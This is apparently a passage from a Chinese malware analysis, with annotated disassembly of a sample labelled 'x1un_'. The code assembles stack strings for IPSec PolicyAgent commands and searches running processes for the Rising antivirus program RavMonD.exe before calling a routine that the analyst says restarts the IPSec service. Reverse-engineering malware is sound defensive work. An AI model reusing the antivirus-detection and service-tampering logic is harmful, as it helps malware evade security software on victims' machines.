
```
0041E504    C645 FD 6C      mov byte ptr ss:[ebp-3],6C

0041E508    C645 FE 6C      mov byte ptr ss:[ebp-2],6C

0041E50C    885D FF        mov byte ptr ss:[ebp-1],bl

0041E50F    C685 70FFFFFF 6>mov byte ptr ss:[ebp-90],63

0041E516    8895 71FFFFFF  mov byte ptr ss:[ebp-8F],dl

0041E51C    C685 72FFFFFF 6>mov byte ptr ss:[ebp-8E],6E

0041E523    C685 73FFFFFF 6>mov byte ptr ss:[ebp-8D],66

0041E52A    C685 74FFFFFF 6>mov byte ptr ss:[ebp-8C],69

0041E531    C685 75FFFFFF 6>mov byte ptr ss:[ebp-8B],67

0041E538    C685 76FFFFFF 2>mov byte ptr ss:[ebp-8A],20

0041E53F    C685 77FFFFFF 5>mov byte ptr ss:[ebp-89],50

0041E546    8895 78FFFFFF  mov byte ptr ss:[ebp-88],dl

0041E54C    C685 79FFFFFF 6>mov byte ptr ss:[ebp-87],6C

0041E553    C685 7AFFFFFF 6>mov byte ptr ss:[ebp-86],69

0041E55A    C685 7BFFFFFF 6>mov byte ptr ss:[ebp-85],63

0041E561    C685 7CFFFFFF 7>mov byte ptr ss:[ebp-84],79

0041E568    C685 7DFFFFFF 4>mov byte ptr ss:[ebp-83],41

0041E56F    C685 7EFFFFFF 6>mov byte ptr ss:[ebp-82],67

0041E576    C685 7FFFFFFF 6>mov byte ptr ss:[ebp-81],65

0041E57D    C645 80 6E      mov byte ptr ss:[ebp-80],6E

0041E581    8845 81        mov byte ptr ss:[ebp-7F],al

0041E584    C645 82 20      mov byte ptr ss:[ebp-7E],20

0041E588    C645 83 73      mov byte ptr ss:[ebp-7D],73

0041E58C    8845 84        mov byte ptr ss:[ebp-7C],al

0041E58F    884D 85        mov byte ptr ss:[ebp-7B],cl

0041E592    C645 86 72      mov byte ptr ss:[ebp-7A],72

0041E596    8845 87        mov byte ptr ss:[ebp-79],al

0041E599    C645 88 3D      mov byte ptr ss:[ebp-78],3D

0041E59D    C645 89 20      mov byte ptr ss:[ebp-77],20

0041E5A1    884D 8A        mov byte ptr ss:[ebp-76],cl

0041E5A4    C645 8B 75      mov byte ptr ss:[ebp-75],75

0041E5A8    8845 8C        mov byte ptr ss:[ebp-74],al

0041E5AB    8855 8D        mov byte ptr ss:[ebp-73],dl

0041E5AE    885D 8E        mov byte ptr ss:[ebp-72],bl

0041E5B1    C645 A4 73      mov byte ptr ss:[ebp-5C],73

0041E5B5    8845 A5        mov byte ptr ss:[ebp-5B],al

0041E5B8    8855 A6        mov byte ptr ss:[ebp-5A],dl

0041E5BB    8845 B3        mov byte ptr ss:[ebp-4D],al

0041E5BE    8845 91        mov byte ptr ss:[ebp-6F],al

0041E5C1    884D 92        mov byte ptr ss:[ebp-6E],cl

0041E5C4    8845 94        mov byte ptr ss:[ebp-6C],al

0041E5C7    8845 A0        mov byte ptr ss:[ebp-60],al

0041E5CA    884D BD        mov byte ptr ss:[ebp-43],cl

0041E5CD    884D C9        mov byte ptr ss:[ebp-37],cl

0041E5D0    B9 3F000000    mov ecx,3F

0041E5D5    33C0           xor eax,eax

0041E5D7    8DBD 70FAFFFF  lea edi,dword ptr ss:[ebp-590]

0041E5DD    F3:AB        rep stos dword ptr es:[edi]

0041E5DF    66:AB        stos word ptr es:[edi]

0041E5E1    C645 A7 70      mov byte ptr ss:[ebp-59],70

0041E5E5    C645 A8 20      mov byte ptr ss:[ebp-58],20

0041E5E9    C645 A9 50      mov byte ptr ss:[ebp-57],50

0041E5ED    8855 AA        mov byte ptr ss:[ebp-56],dl

0041E5F0    C645 AB 6C      mov byte ptr ss:[ebp-55],6C

0041E5F4    C645 AC 69      mov byte ptr ss:[ebp-54],69

0041E5F8    C645 AD 63      mov byte ptr ss:[ebp-53],63

0041E5FC    C645 AE 79      mov byte ptr ss:[ebp-52],79

0041E600    C645 AF 41      mov byte ptr ss:[ebp-51],41

0041E604    C645 B0 67      mov byte ptr ss:[ebp-50],67

0041E608    C645 B1 65      mov byte ptr ss:[ebp-4F],65

0041E60C    C645 B2 6E      mov byte ptr ss:[ebp-4E],6E

0041E610    885D B4        mov byte ptr ss:[ebp-4C],bl

0041E613    C645 90 73      mov byte ptr ss:[ebp-70],73

0041E617    C645 93 72      mov byte ptr ss:[ebp-6D],72

0041E61B    C645 95 20      mov byte ptr ss:[ebp-6B],20

0041E61F    C645 96 50      mov byte ptr ss:[ebp-6A],50

0041E623    8855 97        mov byte ptr ss:[ebp-69],dl

0041E626    C645 98 6C      mov byte ptr ss:[ebp-68],6C

0041E62A    C645 99 69      mov byte ptr ss:[ebp-67],69

0041E62E    C645 9A 63      mov byte ptr ss:[ebp-66],63

0041E632    C645 9B 79      mov byte ptr ss:[ebp-65],79

0041E636    C645 9C 41      mov byte ptr ss:[ebp-64],41

0041E63A    C645 9D 67      mov byte ptr ss:[ebp-63],67

0041E63E    C645 9E 65      mov byte ptr ss:[ebp-62],65

0041E642    C645 9F 6E      mov byte ptr ss:[ebp-61],6E

0041E646    885D A1        mov byte ptr ss:[ebp-5F],bl

0041E649    C645 B8 70      mov byte ptr ss:[ebp-48],70

0041E64D    C645 B9 72      mov byte ptr ss:[ebp-47],72

0041E651    8855 BA        mov byte ptr ss:[ebp-46],dl

0041E654    C645 BB 67      mov byte ptr ss:[ebp-45],67

0041E658    C645 BC 72      mov byte ptr ss:[ebp-44],72

0041E65C    C645 BE 7E      mov byte ptr ss:[ebp-42],7E

0041E660    C645 BF 31      mov byte ptr ss:[ebp-41],31

0041E664    C645 C0 5C      mov byte ptr ss:[ebp-40],5C

0041E668    C645 C1 41      mov byte ptr ss:[ebp-3F],41

0041E66C    C645 C2 54      mov byte ptr ss:[ebp-3E],54

0041E670    C645 C3 49      mov byte ptr ss:[ebp-3D],49

0041E674    885D C4        mov byte ptr ss:[ebp-3C],bl

0041E677    C645 C8 52      mov byte ptr ss:[ebp-38],52

0041E67B    C645 CA 76      mov byte ptr ss:[ebp-36],76

0041E67F    C645 CB 4D      mov byte ptr ss:[ebp-35],4D

0041E683    8855 CC        mov byte ptr ss:[ebp-34],dl

0041E686    C645 CD 6E      mov byte ptr ss:[ebp-33],6E

0041E68A    C645 CE 44      mov byte ptr ss:[ebp-32],44

0041E68E    C645 CF 2E      mov byte ptr ss:[ebp-31],2E

0041E692    C645 D0 65      mov byte ptr ss:[ebp-30],65

0041E696    C645 D1 78      mov byte ptr ss:[ebp-2F],78

0041E69A    C645 D2 65      mov byte ptr ss:[ebp-2E],65

0041E69E    885D D3        mov byte ptr ss:[ebp-2D],bl

0041E6A1    AA             stos byte ptr es:[edi]

0041E6A2    90             nop

0041E6A3    90             nop

0041E6A4    03DA           add ebx,edx

0041E6A6    90             nop

0041E6A7    90             nop

0041E6A8    03DA           add ebx,edx

0041E6AA    90             nop

0041E6AB    F7D2           not edx

0041E6AD    90             nop

0041E6AE    90             nop

0041E6AF    90             nop

0041E6B0    42             inc edx

0041E6B1    90             nop

0041E6B2    90             nop

0041E6B3    03DA           add ebx,edx

0041E6B5    90             nop

0041E6B6    90             nop

0041E6B7    F7DA           neg edx

0041E6B9    90             nop

0041E6BA    90             nop

0041E6BB    8D45 C8        lea eax,dword ptr ss:[ebp-38]           RavMondD.exe 明显瑞星主程序

0041E6BE    50             push eax

0041E6BF    E8 BCF8FFFF    call x1un_.0041DF80                     创建进程快照，开始遍历进程，查找瑞星进程

这里就是很基本的函数了：`CreateToolhelp32Snapshot`,`Process32First`,`Process32Next`,没有找到瑞星进程~~~~

0041E6C4    83C4 04        add esp,4

0041E6C7    85C0           test eax,eax

0041E6C9    75 78          jnz short x1un_.0041E743                此处没有跳

0041E6CB    E8 90FBFFFF    call x1un_.0041E260                     这个函数关键（重启 IPSec 服务），跟进看看
```

```
{

0041E260    81EC 3C020000  sub esp,23C                               分配空间

0041E266    B0 6F            mov al,6F                                下面就是初始化空间了，最后会打开注册表的 IPSec

0041E268    53              push ebx

0041E269    884424 0E       mov byte ptr ss:[esp+E],al

0041E26D    B3 69            mov bl,69

0041E26F    884424 1A       mov byte ptr ss:[esp+1A],al

0041E273    884424 1C       mov byte ptr ss:[esp+1C],al

0041E277    884424 24       mov byte ptr ss:[esp+24],al

0041E27B    884424 2F       mov byte ptr ss:[esp+2F],al

0041E27F    884424 36       mov byte ptr ss:[esp+36],al
}
```
